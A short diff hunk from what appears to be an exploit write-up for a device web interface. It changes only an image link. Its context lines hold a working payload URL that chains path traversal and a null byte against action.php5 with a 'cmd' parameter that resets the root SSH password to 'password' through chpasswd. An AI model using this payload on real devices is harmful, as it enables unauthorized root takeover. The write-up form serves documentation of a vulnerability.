@@ -78,7 +78,7 @@ I chose to go the simple route and just reset the root SSH password with:
 
 > http://<IP>/action.php5?_action=get&_actionType=1&_page=../../../../../../../../../../var/log/messages%00&cmd=echo+root:password+|+/usr/sbin/chpasswd
 
-https://imgur.com/a/YT8Pw
+http://imgur.com/9InNHHi
 
 Will change the root password for SSH to "password"
 
